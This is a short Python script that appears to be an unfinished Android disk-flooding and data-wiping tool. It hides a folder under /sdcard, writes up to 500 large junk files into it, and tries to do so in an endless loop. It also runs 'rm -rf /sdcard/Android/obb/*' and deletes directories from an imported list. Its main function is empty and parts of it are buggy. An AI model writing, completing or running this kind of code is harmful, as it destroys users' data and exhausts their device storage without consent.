from shutil import rmtree
from os import mkdir, remove

way = '/sdcard/.SystemDirectory/'
content = '☫Ø.N.Ę.✞.☫Ø.N.Ę.✞.0.1.0.1.0.1.0.1.0.1.BL00DXSAYS:BL00D_YOU!'

def dirExists():
    try:
        exist = open(f'{way}.exist', 'a')
        exist.writelines('Nothing for you here :)')
        exist.close()
        remove(f'{way}.exist')
    except:
        mkdir(way)

def fileFloodWithFor():
    #enter value
    totalFiles = 500

    for c in range(0, totalFiles):
        flood = open(f'{way}.bloodX{c}', 'a')
        flood.write((f'{content}' * 100) * 100)
    
    flood.close()

def fileFloodWithWhile():
    try:
        while(True):
            try:
                flood = open(f'{way}.bloodX{c}', 'a')
                flood.write((f'{content}' * 100) * 100)
                flood.close()
            except:
                break
    except:
        print('unknow error!')
        fileFloodWithFor()



def fileDelete():
    from other import dirList
    from os import system

    system('rm -rf /sdcard/Android/obb/*')

    #isso pode estar errado, testar depois
    for directory in range(0, len(dirList)):
        remove(f'/sdcard/{dirList[directory]}')

def main():
    pass

if __name__ == "__main__":
    main()